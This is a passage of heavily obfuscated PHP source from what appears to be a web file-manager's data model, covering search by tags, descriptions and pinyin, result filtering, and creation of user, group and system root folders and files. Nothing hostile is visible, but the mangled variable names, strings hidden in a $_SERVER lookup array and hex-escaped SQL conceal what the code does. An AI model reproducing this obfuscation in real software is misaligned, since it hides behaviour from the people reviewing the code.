unset($³ñ¡™°[$ùÅíÒô[32]]); unset($¼‡ğúâ²[$ùÅíÒô[511]]); $º¤•éˆ’ = $this->field($† Ú‘ÇÌ)->where($³ñ¡™°)->limit($ùÅíÒô[2147])->select(); if (!$º¤•éˆ’ || count($º¤•éˆ’) == 0) { return; } $…•‹ÀâÆ[$ùÅíÒô[415]] = array_merge($º¤•éˆ’, $…•‹ÀâÆ[$ùÅíÒô[415]]); $…•‹ÀâÆ[$ùÅíÒô[412]][$ùÅíÒô[413]] += count($º¤•éˆ’); } private function _listSearchTag(&$Ìî°Ò», $Éß¾æ •, $–ËÙË«Ù) { $´šÏ¹ï =& $_SERVER[ ÇƒŠìÀ]; if (!$Éß¾æ •[$´šÏ¹ï[1981]] || $Ìî°Ò»[$´šÏ¹ï[412]][$´šÏ¹ï[399]] > 1) { return; } $ıò–åúÙ = Model($´šÏ¹ï[2148])->listData(); $Ş„ùªŸõ = array(); $æ¹Òéµæ = $Éß¾æ •[$´šÏ¹ï[1981]]; foreach ($ıò–åúÙ as $¶ÎüÀì) { $Ä©Û¢¹» = $¶ÎüÀì[$´šÏ¹ï[32]]; $Ã»ş¾üĞ = str_replace($´šÏ¹ï[53], $´šÏ¹ï[12], Pinyin::get($Ä©Û¢¹»)); if (stripos($Ä©Û¢¹», $æ¹Òéµæ) !== !1 || stripos($Ã»ş¾üĞ, $æ¹Òéµæ) !== !1) { $Ş„ùªŸõ[] = $¶ÎüÀì[$´šÏ¹ï[445]]; } } if (!$Ş„ùªŸõ) { return; } $û­úÔª³ = array($´šÏ¹ï[470] => array($´šÏ¹ï[7], $Ş„ùªŸõ), $´šÏ¹ï[1689] => USER_ID); $¹¶ª®Äæ = Model($´šÏ¹ï[472])->field($´šÏ¹ï[86])->where($û­úÔª³)->select(); $¹¶ª®Äæ = array_to_keyvalue($¹¶ª®Äæ, $´šÏ¹ï[12], $´šÏ¹ï[86]); $Ñ¨ÛŒ±¯ = array_unique($¹¶ª®Äæ); $this->_listSearchMerge($Ìî°Ò», $Éß¾æ •, $–ËÙË«Ù, $Ñ¨ÛŒ±¯); } private function _listSearchDesc(&$Û¢÷’Ğõ, $¢¯›Ïó¼, $ç³ÓÖ®™) { $Á…‹Š¤Á =& $_SERVER[ ÇƒŠìÀ]; if (!$¢¯›Ïó¼[$Á…‹Š¤Á[1981]] || $Û¢÷’Ğõ[$Á…‹Š¤Á[412]][$Á…‹Š¤Á[399]] > 1) { return; } $‘ş¶ëÈ¼ = array($Á…‹Š¤Á[96] => $Á…‹Š¤Á[496], $Á…‹Š¤Á[420] => array($Á…‹Š¤Á[429], $Á…‹Š¤Á[1983] . $¢¯›Ïó¼[$Á…‹Š¤Á[1981]] . $Á…‹Š¤Á[1983])); $´”¡£ø = !1; if ($´”¡£ø) { $´‘ÂËíò = $this->listSearchChildren($¢¯›Ïó¼[$Á…‹Š¤Á[182]]); $´‘ÂËíò = array_unique($´‘ÂËíò); if (!$´‘ÂËíò) { return; } $‘ş¶ëÈ¼[$Á…‹Š¤Á[183]] = array($Á…‹Š¤Á[7], $´‘ÂËíò); } $¹ñÙ€á£ = Model($Á…‹Š¤Á[602])->field($Á…‹Š¤Á[183])->where($‘ş¶ëÈ¼)->limit(5000)->select(); $Ü¿ÀË¶ì = array_to_keyvalue($¹ñÙ€á£, $Á…‹Š¤Á[12], $Á…‹Š¤Á[183]); $this->_listSearchMerge($Û¢÷’Ğõ, $¢¯›Ïó¼, $ç³ÓÖ®™, $Ü¿ÀË¶ì); } private function _listSearchGroupTag(&$­ğÜìÇ—, $™Ğ¹ô”ß, $Ä°µÙİ) { $Á©ˆãŠõ =& $_SERVER[ ÇƒŠìÀ]; if (!$™Ğ¹ô”ß[$Á©ˆãŠõ[1981]] || $­ğÜìÇ—[$Á©ˆãŠõ[412]][$Á©ˆãŠõ[399]] > 1 || !$™Ğ¹ô”ß[$Á©ˆãŠõ[182]]) { return; } $€™ªáˆÓ = $this->sourceInfo($™Ğ¹ô”ß[$Á©ˆãŠõ[182]]); if (!$€™ªáˆÓ || $€™ªáˆÓ[$Á©ˆãŠõ[180]] != SourceModel::TYPE_GROUP) { return; } $—ø‡Ã ı = $€™ªáˆÓ[$Á©ˆãŠõ[540]]; $™àÒœ“© = Model($Á©ˆãŠõ[2149])->get($—ø‡Ã ı); $¼êè³¦ = array(); $ÇŠ­Ä½Å = $™Ğ¹ô”ß[$Á©ˆãŠõ[1981]]; foreach ($™àÒœ“©[$Á©ˆãŠõ[415]] as $ïŠĞô¸†) { $ØÅèó˜¼ = $ïŠĞô¸†[$Á©ˆãŠõ[32]]; $ÅËğØñÌ = str_replace($Á©ˆãŠõ[53], $Á©ˆãŠõ[12], Pinyin::get($ØÅèó˜¼)); if (stripos($ØÅèó˜¼, $ÇŠ­Ä½Å) !== !1 || stripos($ÅËğØñÌ, $ÇŠ­Ä½Å) !== !1) { $¼êè³¦[] = $ïŠĞô¸†[$Á©ˆãŠõ[445]]; } } if (!$¼êè³¦) { return; } $…³ê˜˜ = array($Á©ˆãŠõ[470] => array($Á©ˆãŠõ[7], $¼êè³¦), $Á©ˆãŠõ[1689] => 0, $Á©ˆãŠõ[33] => $Á©ˆãŠõ[2003] . $—ø‡Ã ı); $ ‡Æ†ˆ = Model($Á©ˆãŠõ[472])->field($Á©ˆãŠõ[86])->where($…³ê˜˜)->select(); $ ‡Æ†ˆ = array_to_keyvalue($ ‡Æ†ˆ, $Á©ˆãŠõ[12], $Á©ˆãŠõ[86]); $ı¬İº° = array_unique($ ‡Æ†ˆ); $this->_listSearchMerge($­ğÜìÇ—, $™Ğ¹ô”ß, $Ä°µÙİ, $ı¬İº°); } private function _listSearchMerge(&$ Áäøö©, $ÆúÒ °Ä, $ÛØÆá˜¼, $¡ÛäÛ™Ã) { $éë¤Í—® =& $_SERVER[ ÇƒŠìÀ]; if (!$¡ÛäÛ™Ã) { return; } $€ÇÑ•˜ = array_to_keyvalue($ Áäøö©[$éë¤Í—®[415]], $éë¤Í—®[12], $éë¤Í—®[183]); $éë´ó–Î = array_diff($¡ÛäÛ™Ã, $€ÇÑ•˜); if (!$éë´ó–Î) { return; } $£çé²Ô‘ = array($éë¤Í—®[183] => array($éë¤Í—®[7], $éë´ó–Î)); $¹Ê«ËÁË = $this->field($ÛØÆá˜¼)->where($£çé²Ô‘)->select(); if (!$¹Ê«ËÁË) { return; } $Å‚ÌË½Å = array(); foreach ($¹Ê«ËÁË as $‚÷êÄ…ã) { if ($this->_listSearchFilter($‚÷êÄ…ã, $ÆúÒ °Ä)) { $Å‚ÌË½Å[] = $‚÷êÄ…ã; } } $ Áäøö©[$éë¤Í—®[415]] = array_merge($Å‚ÌË½Å, $ Áäøö©[$éë¤Í—®[415]]); $ Áäøö©[$éë¤Í—®[412]][$éë¤Í—®[413]] += count($Å‚ÌË½Å); } private function _listSearchFilter($·¡µ“ö, $öÔâ®—Ş) { $çó»êí„ =& $_SERVER[ ÇƒŠìÀ]; $«·–›ÒÀ = $·¡µ“ö[$çó»êí„[455]] == $çó»êí„[90]; if (!strstr($·¡µ“ö[$çó»êí„[555]], $çó»êí„[50] . $öÔâ®—Ş[$çó»êí„[182]] . $çó»êí„[50])) { return !1; } if (isset($öÔâ®—Ş[$çó»êí„[456]]) && $öÔâ®—Ş[$çó»êí„[456]] != $çó»êí„[1942]) { if ($öÔâ®—Ş[$çó»êí„[456]] == $çó»êí„[77] && !$«·–›ÒÀ) { return !1; } if ($öÔâ®—Ş[$çó»êí„[456]] != $çó»êí„[77] && $«·–›ÒÀ) { return !1; } if (!strstr($·¡µ“ö[$çó»êí„[177]], $çó»êí„[50] . $öÔâ®—Ş[$çó»êí„[456]] . $çó»êí„[50])) { return !1; } } if (isset($öÔâ®—Ş[$çó»êí„[2150]]) && $öÔâ®—Ş[$çó»êí„[2150]] < $·¡µ“ö[$çó»êí„[78]]) { return !1; } if (isset($öÔâ®—Ş[$çó»êí„[2151]]) && $öÔâ®—Ş[$çó»êí„[2151]] > $·¡µ“ö[$çó»êí„[78]]) { return !1; } if (isset($öÔâ®—Ş[$çó»êí„[632]]) && $öÔâ®—Ş[$çó»êí„[632]] != $·¡µ“ö[$çó»êí„[499]]) { return !1; } return !0; } public function listSearchChildren($İšÚÎ®Ç, $å¨ÎèÀ = 5000) { $²Õı¸µÂ =& $_SERVER[ ÇƒŠìÀ]; $—«ÂÎˆ = array(); $ñáÊàÖ· = $this->sourceInfo($İšÚÎ®Ç); $‹›İ—± = array($²Õı¸µÂ[555] => array($²Õı¸µÂ[429], $ñáÊàÖ·[$²Õı¸µÂ[555]] . $ñáÊàÖ·[$²Õı¸µÂ[183]] . $²Õı¸µÂ[583])); $â¹Ç¯”Ï = $this->field($²Õı¸µÂ[78])->where($‹›İ—±)->limit($å¨ÎèÀ + 1)->select(); $Öò€™éÃ = is_array($â¹Ç¯”Ï) ? count($â¹Ç¯”Ï) : 0; if ($Öò€™éÃ > $å¨ÎèÀ) { return $this->_listSearchChildrenNear($İšÚÎ®Ç, $å¨ÎèÀ); } $åö…¡œ = $this->field($²Õı¸µÂ[183])->where($‹›İ—±)->select(); $—«ÂÎˆ = array_to_keyvalue($åö…¡œ, $²Õı¸µÂ[12], $²Õı¸µÂ[183]); return $—«ÂÎˆ; } private function _listSearchChildrenNear($‰¨ªË©, $§Ñ¶ÖË›) { $“Òäû¡Ç =& $_SERVER[ ÇƒŠìÀ]; $ûş‰Ì€Ó = array(); $¬ƒÂéÇİ = array($“Òäû¡Ç[182] => $‰¨ªË©); $Á­ÂÛš = $this->field($“Òäû¡Ç[2152])->where($¬ƒÂéÇİ)->select(); $·±íÅï = array_to_keyvalue(array_filter_by_field($Á­ÂÛš, $“Òäû¡Ç[455], $“Òäû¡Ç[90]), $“Òäû¡Ç[12], $“Òäû¡Ç[183]); $ûş‰Ì€Ó = array_merge($ûş‰Ì€Ó, array_to_keyvalue($Á­ÂÛš, $“Òäû¡Ç[12], $“Òäû¡Ç[183])); if (!$·±íÅï) { return $ûş‰Ì€Ó; } $¬ƒÂéÇİ = array($“Òäû¡Ç[182] => array($“Òäû¡Ç[7], $·±íÅï)); $Á­ÂÛš = $this->field($“Òäû¡Ç[2152])->where($¬ƒÂéÇİ)->limit($§Ñ¶ÖË›)->select(); $ûş‰Ì€Ó = array_merge($ûş‰Ì€Ó, array_to_keyvalue($Á­ÂÛš, $“Òäû¡Ç[12], $“Òäû¡Ç[183])); $ûş‰Ì€Ó = array_slice($ûş‰Ì€Ó, 0, intval($§Ñ¶ÖË›)); return $ûş‰Ì€Ó; } private function _listSearchBindPinyin($„ŠÊÌÁ˜, &$×¾³Şƒß, &$îËå“‚ğ) { $Ø–‚®İÊ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($„ŠÊÌÁ˜[$Ø–‚®İÊ[1981]]) || !$„ŠÊÌÁ˜[$Ø–‚®İÊ[1981]]) { return; } if (!Input::check($„ŠÊÌÁ˜[$Ø–‚®İÊ[1981]], $Ø–‚®İÊ[364]) || strlen($„ŠÊÌÁ˜[$Ø–‚®İÊ[1981]]) < 2) { return; } $²†•‚ú = "\x4c\105\106\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\137\x73\x6f\x75\x72\143\145\137\x6d\145\x74\141\x20\155\145\164\x61\x20\157\x6e\x20\x73\157\x75\x72\x63\145\56\x73\157\165\162\x63\x65\111\104\x20\75\x20\x6d\145\164\141\x2e\x73\157\165\x72\x63\x65\x49\104"; $¡·úå± = array(); $îËå“‚ğ = str_replace(array($Ø–‚®İÊ[248], $Ø–‚®İÊ[53], $Ø–‚®İÊ[2153]), $Ø–‚®İÊ[12], $îËå“‚ğ); $îËå“‚ğ = $Ø–‚®İÊ[481] . str_replace($Ø–‚®İÊ[50], $Ø–‚®İÊ[482], $îËå“‚ğ); $‚Óäúñ¼ = $×¾³Şƒß[$Ø–‚®İÊ[32]]; unset($×¾³Şƒß[$Ø–‚®İÊ[32]]); foreach ($×¾³Şƒß as $¼åòÌÕÊ => $Ê’Ã•¯­) { $¡·úå±[$Ø–‚®İÊ[481] . $¼åòÌÕÊ] = $Ê’Ã•¯­; } foreach ($‚Óäúñ¼ as $•™±Ø¼¼) { $¡·úå±[] = array($Ø–‚®İÊ[486] => $•™±Ø¼¼, $Ø–‚®İÊ[1035] => $Ø–‚®İÊ[1985], array($Ø–‚®İÊ[2154] => $•™±Ø¼¼, $Ø–‚®İÊ[2155] => array($Ø–‚®İÊ[7], array($Ø–‚®İÊ[508], $Ø–‚®İÊ[507])))); } $this->join($²†•‚ú); $×¾³Şƒß = $¡·úå±; } private function _parseSearchWhere($”¥ÔŸ›·) { $¢Ë®°µš =& $_SERVER[ ÇƒŠìÀ]; $Ê»¯ğ = array(); if (isset($”¥ÔŸ›·[$¢Ë®°µš[789]]) && $”¥ÔŸ›·[$¢Ë®°µš[789]]) { $Ê»¯ğ[$¢Ë®°µš[87]] = array($¢Ë®°µš[2156], $”¥ÔŸ›·[$¢Ë®°µš[789]]); } if (isset($”¥ÔŸ›·[$¢Ë®°µš[790]]) && $”¥ÔŸ›·[$¢Ë®°µš[790]]) { $ÚÑŠŠÙ± = array($¢Ë®°µš[2157], $”¥ÔŸ›·[$¢Ë®°µš[790]]); if ($Ê»¯ğ[$¢Ë®°µš[87]]) { $Ê»¯ğ[$¢Ë®°µš[87]] = array($Ê»¯ğ[$¢Ë®°µš[87]], $ÚÑŠŠÙ±, $¢Ë®°µš[2158]); } else { $Ê»¯ğ[$¢Ë®°µš[87]] = $ÚÑŠŠÙ±; } } if (isset($”¥ÔŸ›·[$¢Ë®°µš[2150]]) && $”¥ÔŸ›·[$¢Ë®°µš[2150]] > 0) { $Ê»¯ğ[$¢Ë®°µš[78]] = array($¢Ë®°µš[2156], $”¥ÔŸ›·[$¢Ë®°µš[2150]]); } if (isset($”¥ÔŸ›·[$¢Ë®°µš[2151]]) && $”¥ÔŸ›·[$¢Ë®°µš[2151]]) { $ÚÑŠŠÙ± = array($¢Ë®°µš[2157], $”¥ÔŸ›·[$¢Ë®°µš[2151]]); if ($Ê»¯ğ[$¢Ë®°µš[78]]) { $Ê»¯ğ[$¢Ë®°µš[78]] = array($Ê»¯ğ[$¢Ë®°µš[78]], $ÚÑŠŠÙ±, $¢Ë®°µš[2158]); } else { $Ê»¯ğ[$¢Ë®°µš[78]] = $ÚÑŠŠÙ±; } } if (isset($”¥ÔŸ›·[$¢Ë®°µš[632]]) && $”¥ÔŸ›·[$¢Ë®°µš[632]]) { $Ê»¯ğ[] = array($¢Ë®°µš[499] => $”¥ÔŸ›·[$¢Ë®°µš[632]], $¢Ë®°µš[497] => $”¥ÔŸ›·[$¢Ë®°µš[632]], $¢Ë®°µš[1035] => $¢Ë®°µš[1985]); } if (isset($”¥ÔŸ›·[$¢Ë®°µš[456]]) && $”¥ÔŸ›·[$¢Ë®°µš[456]]) { $¸Àñğ¢ = $”¥ÔŸ›·[$¢Ë®°µš[456]]; if ($¸Àñğ¢ == $¢Ë®°µš[77]) { $Ê»¯ğ[$¢Ë®°µš[455]] = 1; } else { if ($¸Àñğ¢ == $¢Ë®°µš[2159]) { $Ê»¯ğ[$¢Ë®°µš[455]] = 0; } else { if ($¸Àñğ¢) { $¸Àñğ¢ = is_array($¸Àñğ¢) ? $¸Àñğ¢ : explode($¢Ë®°µš[50], $¸Àñğ¢); $Ê»¯ğ[$¢Ë®°µš[456]] = array($¢Ë®°µš[462], $¸Àñğ¢); $Ê»¯ğ[$¢Ë®°µš[455]] = 0; } } } } $this->_parseSearchParent($”¥ÔŸ›·, $Ê»¯ğ); if (isset($”¥ÔŸ›·[$¢Ë®°µš[1981]]) && trim($”¥ÔŸ›·[$¢Ë®°µš[1981]])) { $Èéõ¨ë· = trim($”¥ÔŸ›·[$¢Ë®°µš[1981]]); $õñÚæÇ‚ = explode($¢Ë®°µš[53], $Èéõ¨ë·); if (strlen($Èéõ¨ë·) > 2 && (substr($Èéõ¨ë·, 0, 1) == $¢Ë®°µš[120] && substr($Èéõ¨ë·, -1) == $¢Ë®°µš[120]) || substr($Èéõ¨ë·, 0, 1) == $¢Ë®°µš[58] && substr($Èéõ¨ë·, -1) == $¢Ë®°µš[58]) { $Èéõ¨ë· = substr($Èéõ¨ë·, 1, -1); $õñÚæÇ‚ = array($Èéõ¨ë·); } $Ê»¯ğ[$¢Ë®°µš[32]] = array(array($¢Ë®°µš[582], $¢Ë®°µš[1983] . $Èéõ¨ë· . $¢Ë®°µš[1983])); if (count($õñÚæÇ‚) > 1) { $Ê»¯ğ[$¢Ë®°µš[32]] = array(); foreach ($õñÚæÇ‚ as $¦ëƒóÆî) { if (!trim($¦ëƒóÆî)) { continue; } $Ê»¯ğ[$¢Ë®°µš[32]][] = array($¢Ë®°µš[582], $¢Ë®°µš[1983] . trim($¦ëƒóÆî) . $¢Ë®°µš[1983]); } } } return $Ê»¯ğ; } private function _parseSearchParent($¼îºØ‰, &$½ÅŞ·Ìä) { $ÂÃã÷şÎ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($¼îºØ‰[$ÂÃã÷şÎ[182]]) || !$¼îºØ‰[$ÂÃã÷şÎ[182]]) { return; } $¢çŠÊÙÇ = $this->pathInfo($¼îºØ‰[$ÂÃã÷şÎ[182]]); $‚ˆŸÍäÃ = $¢çŠÊÙÇ[$ÂÃã÷şÎ[182]] . $ÂÃã÷şÎ[12] === $ÂÃã÷şÎ[214]; $×»×â÷€ = $¢çŠÊÙÇ[$ÂÃã÷şÎ[180]] == $ÂÃã÷şÎ[549]; if ($¢çŠÊÙÇ[$ÂÃã÷şÎ[566]] == $ÂÃã÷şÎ[567]) { $‰¥ÛÏ«° = $this->sourceInfo($¼îºØ‰[$ÂÃã÷şÎ[182]]); $¢çŠÊÙÇ[$ÂÃã÷şÎ[555]] = $‰¥ÛÏ«°[$ÂÃã÷şÎ[555]]; } $½ÅŞ·Ìä[$ÂÃã÷şÎ[622]] = array($ÂÃã÷şÎ[582], $¢çŠÊÙÇ[$ÂÃã÷şÎ[555]] . $¼îºØ‰[$ÂÃã÷şÎ[182]] . $ÂÃã÷şÎ[583]); $ö‘¨½µ‹ = isset($¼îºØ‰[$ÂÃã÷şÎ[1846]]) && in_array($ÂÃã÷şÎ[549], $¼îºØ‰[$ÂÃã÷şÎ[1846]]); if (!$ö‘¨½µ‹ || !$×»×â÷€ || !$‚ˆŸÍäÃ || !$¢çŠÊÙÇ[$ÂÃã÷şÎ[457]]) { return; } if (!AuthModel::authCheckRoot($¢çŠÊÙÇ[$ÂÃã÷şÎ[457]][$ÂÃã÷şÎ[458]])) { return; } $á±îìùä = $¢çŠÊÙÇ[$ÂÃã÷şÎ[540]] . $ÂÃã÷şÎ[12]; if ($á±îìùä == $ÂÃã÷şÎ[90]) { unset($½ÅŞ·Ìä[$ÂÃã÷şÎ[622]]); $½ÅŞ·Ìä[$ÂÃã÷şÎ[180]] = self::TYPE_GROUP; return; } $Ç­ğ»¡ = Model($ÂÃã÷şÎ[556])->groupChildrenAll($á±îìùä); $šô—ÂÇ¦ = count($Ç­ğ»¡); if ($šô—ÂÇ¦ <= 1) { return; } $øÔ€í­¼ = array($ÂÃã÷şÎ[182] => 0, $ÂÃã÷şÎ[180] => self::TYPE_GROUP, $ÂÃã÷şÎ[540] => array($ÂÃã÷şÎ[7], $Ç­ğ»¡)); $óùÁğÔ = $this->field($ÂÃã÷şÎ[2160])->where($øÔ€í­¼)->limit($šô—ÂÇ¦)->select(); $½ÅŞ·Ìä[$ÂÃã÷şÎ[622]] = array(); foreach ($óùÁğÔ as $£Ş…š¾±) { $½ÅŞ·Ìä[$ÂÃã÷şÎ[622]][] = array($ÂÃã÷şÎ[582], $ÂÃã÷şÎ[565] . $£Ş…š¾±[$ÂÃã÷şÎ[183]] . $ÂÃã÷şÎ[583]); } $½ÅŞ·Ìä[$ÂÃã÷şÎ[622]][] = $ÂÃã÷şÎ[1985]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ƒ²¼’Û) { $’ÙÄ°™× =& $_SERVER[ ÇƒŠìÀ]; $æ•Ãâ³¯ = Model($’ÙÄ°™×[548])->where(array($’ÙÄ°™×[1680] => $ƒ²¼’Û))->find(); $€ö‡à×ì = $this->_mkdirRoot(SourceModel::TYPE_USER, $ƒ²¼’Û, $æ•Ãâ³¯[$’ÙÄ°™×[32]]); $this->userDesktopAdd($€ö‡à×ì); return $€ö‡à×ì; } public function userDesktopAdd($ÇÚ¤‡ä«) { $ÚÊÇ»‘Û =& $_SERVER[ ÇƒŠìÀ]; $á¡öéÒŸ = LNG($ÚÊÇ»‘Û[2161]); $ÌÆŠ‰ı = $this->mkdir($ÇÚ¤‡ä«, $á¡öéÒŸ); $this->metaSet($ÌÆŠ‰ı, $ÚÊÇ»‘Û[2162], $ÚÊÇ»‘Û[90]); $this->metaSet($ÇÚ¤‡ä«, $ÚÊÇ»‘Û[2163], $ÌÆŠ‰ı); } public function userPathSafeAdd($ã‹Á¨‹Å) { $Ã¶åĞÛÏ =& $_SERVER[ ÇƒŠìÀ]; $¼ö¶¶¸ = Model($Ã¶åĞÛÏ[548])->getInfoFull($ã‹Á¨‹Å); if (!$¼ö¶¶¸) { return !1; } if (_get($¼ö¶¶¸, $Ã¶åĞÛÏ[570])) { return $¼ö¶¶¸[$Ã¶åĞÛÏ[509]][$Ã¶åĞÛÏ[2164]]; } $ÆÔÁè¾Ï = $this->_mkdirRoot(SourceModel::TYPE_USER, $ã‹Á¨‹Å, $Ã¶åĞÛÏ[2165], $Ã¶åĞÛÏ[476]); Model($Ã¶åĞÛÏ[548])->metaSet($ã‹Á¨‹Å, $Ã¶åĞÛÏ[2164], $ÆÔÁè¾Ï); $this->metaSet($ÆÔÁè¾Ï, $Ã¶åĞÛÏ[2166], $ã‹Á¨‹Å); return $ÆÔÁè¾Ï; } public function groupRootAdd($¸‘¼â²¸) { $å«½ï’ =& $_SERVER[ ÇƒŠìÀ]; $ÆìóÓ†÷ = Model($å«½ï’[556])->where(array($å«½ï’[1975] => $¸‘¼â²¸))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¸‘¼â²¸, $ÆìóÓ†÷[$å«½ï’[32]]); } public function systemRootPathAdd($Îñ˜áæº) { if ($Îñ˜áæº != $_SERVER[ ÇƒŠìÀ][576]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Îñ˜áæº); } public function userRootRemove($ÎşÀÏËì) { $ÈÁìõ‘ë = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÎşÀÏËì, !0); foreach ($ÈÁìõ‘ë as $˜¦»Ùë) { if (!$˜¦»Ùë) { continue; } $this->remove($˜¦»Ùë[$_SERVER[ ÇƒŠìÀ][183]], !1); } } public function groupRootRemove($·äš—ŒÇ) { $š¥ÈŒ× = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $·äš—ŒÇ); if (!$š¥ÈŒ×) { return; } $this->remove($š¥ÈŒ×[$_SERVER[ ÇƒŠìÀ][183]], !1); } private function _mkdirRoot($ú™ºßº, $öõ‰Ãì, $ƒÈÕûŒ¾, $±•İëÈ = '') { $–œÇ¢ª¨ =& $_SERVER[ ÇƒŠìÀ]; $–õ§•ï– = defined($–œÇ¢ª¨[2109]) ? USER_ID : 0; $†Îá¼«€ = array($–œÇ¢ª¨[447] => 0, $–œÇ¢ª¨[618] => $ú™ºßº, $–œÇ¢ª¨[619] => $öõ‰Ãì, $–œÇ¢ª¨[616] => 1, $–œÇ¢ª¨[620] => $–õ§•ï–, $–œÇ¢ª¨[621] => $–õ§•ï–, $–œÇ¢ª¨[617] => $±•İëÈ, $–œÇ¢ª¨[622] => $–œÇ¢ª¨[565], $–œÇ¢ª¨[474] => 0, $–œÇ¢ª¨[587] => 0, $–œÇ¢ª¨[512] => 0, $–œÇ¢ª¨[623] => $–œÇ¢ª¨[12]); if ($ŞÅ¦ä’µ = $this->where($†Îá¼«€)->find()) { return $ŞÅ¦ä’µ[$–œÇ¢ª¨[183]]; } $ŞÔ€•áŞ = "\x4d\x6f\144\145\x6c\123\x6f\x75\x72\143\x65\x2e\155\x6b\x64\151\x72\x52\157\157\x74\x2e{$ú™ºßº}\x2e{$öõ‰Ãì}\x2e" . $ƒÈÕûŒ¾; CacheLock::lock($ŞÔ€•áŞ); $†Îá¼«€[$–œÇ¢ª¨[32]] = $ƒÈÕûŒ¾; $©ôâƒ = $this->add($†Îá¼«€); $Éø£ø‡‡ = array($–œÇ¢ª¨[624] => short_id($©ôâƒ)); $this->where(array($–œÇ¢ª¨[461] => $©ôâƒ))->save($Éø£ø‡‡); CacheLock::unlock($ŞÔ€•áŞ); return $©ôâƒ; } private function targetSourceRoot($Œà´ÚÔ›, $ØÄœƒÂ¿, $æëşØ£€ = false) { $Ê¯È“˜ğ =& $_SERVER[ ÇƒŠìÀ]; $ãä»Ï² = array($Ê¯È“˜ğ[447] => 0, $Ê¯È“˜ğ[618] => $Œà´ÚÔ›, $Ê¯È“˜ğ[619] => $ØÄœƒÂ¿); if ($æëşØ£€) { $ƒÛ±ÛÈü = $this->where($ãä»Ï²)->select(); return $ƒÛ±ÛÈü ? $ƒÛ±ÛÈü : array(); } $±’‚ˆ˜ = $this->where($ãä»Ï²)->find(); return $±’‚ˆ˜ ? $±’‚ˆ˜ : array(); } public function sourceRootGroup($¶æåÁåÂ) { $Ã—÷¹ö° =& $_SERVER[ ÇƒŠìÀ]; if (is_string($¶æåÁåÂ)) { $¶æåÁåÂ = array($¶æåÁåÂ); } $ùÇäöºÕ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¶æåÁåÂ, $Ã—÷¹ö°[205]); $áè‘–«š = array($Ã—÷¹ö°[415] => $ùÇäöºÕ, $Ã—÷¹ö°[412] => array($Ã—÷¹ö°[787] => count($¶æåÁåÂ))); $this->_listDataApply($áè‘–«š[$Ã—÷¹ö°[415]]); $this->_listMake($áè‘–«š); return array_to_keyvalue($áè‘–«š[$Ã—÷¹ö°[84]], $Ã—÷¹ö°[540]); } public function mkfile($»µİö Š, $·¯ÁãåÌ, $ƒªòôì• = '', $ğîìÅœ‰ = REPEAT_RENAME) { $ä÷Èºì… =& $_SERVER[ ÇƒŠìÀ]; $‘ìÛƒÏò = Model($ä÷Èºì…[644])->addFileByContent($ƒªòôì•, $·¯ÁãåÌ); return $this->_createFileCall($»µİö Š, $·¯ÁãåÌ, $‘ìÛƒÏò, $ğîìÅœ‰, $ä÷Èºì…[1378]); } public function addFile($Øàªò“€, $í—ûÛí , $’¿ë¥•, $…¤¿œ­ë = false, $†—¤›¶ı = REPEAT_RENAME) { $©Â¢à†Á = Model($_SERVER[ ÇƒŠìÀ][644])->addFile($í—ûÛí , $’¿ë¥•, $…¤¿œ­ë); return $this->_createFileCall($Øàªò“€, $’¿ë¥•, $©Â¢à†Á, $†—¤›¶ı); } public function addFileByFileID($íù­€‹, $Ş‚ªÄÅ„, $ê”õ˜…·, $…ÌÈÌ©Î = REPEAT_RENAME) { $™æó»« =& $_SERVER[ ÇƒŠìÀ]; $ĞŞıÎ® = Model($™æó»«[644])->find($Ş‚ªÄÅ„); Model($™æó»«[644])->linkAdd($Ş‚ªÄÅ„); return $this->_createFileCall($íù­€‹, $ê”õ˜…·, $ĞŞıÎ®, $…ÌÈÌ©Î); } public function addFileByRemote($ÄŸî˜¶´, $øŞÈÏòˆ, $®õŠœ´, $ö‹†–Ñõ = array(), $ØçÄŞâ = REPEAT_RENAME) { $ëíµ­ş = Model($_SERVER[ ÇƒŠìÀ][644])->addFileByRemote($øŞÈÏòˆ, $®õŠœ´, $ö‹†–Ñõ); return $this->_createFileCall($ÄŸî˜¶´, $®õŠœ´, $ëíµ­ş, $ØçÄŞâ); } private function _createFileCall($¥Ñ’Ñò”, $©¢Ãƒµ, $äÄ‚„ªÒ, $ƒÏ¢âÒ‡, $·öúùÃ = "\165\x70\154\x6f\141\144") { $ —ÉÑÈ‡ =& $_SERVER[ ÇƒŠìÀ]; $ûõÌı°É = !1; $this->setMasterDB(); $this->lockWriteStart($¥Ñ’Ñò”, $©¢Ãƒµ); $–“ï§À = $this->fileNameExist($¥Ñ’Ñò”, $©¢Ãƒµ); $ˆı‡úÅî = $this->_createFile($¥Ñ’Ñò”, $©¢Ãƒµ, $äÄ‚„ªÒ, $ƒÏ¢âÒ‡, $ûõÌı°É); if (!$ûõÌı°É) { Model($ —ÉÑÈ‡[514])->remove($äÄ‚„ªÒ[$ —ÉÑÈ‡[511]]); } if ($ûõÌı°É && $ˆı‡úÅî && $ˆı‡úÅî != $–“ï§À) { Model($ —ÉÑÈ‡[2134])->eventCreate($ˆı‡úÅî, $·öúùÃ); } $this->lockWriteEnd($¥Ñ’Ñò”, $©¢Ãƒµ); return $ˆı‡úÅî; } public function mkdir($Ñ†ÆúÍ², $ø³£÷²¥, $¢½Ùè³ã = REPEAT_SKIP) { $íÙ÷Ú«“ =& $_SERVER[ ÇƒŠìÀ]; $this->setMasterDB(); $Èø±ÍÔ¨ = $this->sourceInfo($Ñ†ÆúÍ²); if (!$Èø±ÍÔ¨) { return !1; } $this->lockWriteStart($Ñ†ÆúÍ², $ø³£÷²¥); if ($¢½Ùè³ã !== !1) { $ë”ÎÅ£Ä = $this->fileNameExist($Ñ†ÆúÍ², $ø³£÷²¥); if ($ë”ÎÅ£Ä && $¢½Ùè³ã != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ñ†ÆúÍ², $ø³£÷²¥); return $ë”ÎÅ£Ä; } $ø³£÷²¥ = $this->fileNameAuto($Ñ†ÆúÍ², $ø³£÷²¥, $¢½Ùè³ã); } $ÇáÌˆÒ° = array($íÙ÷Ú«“[616] 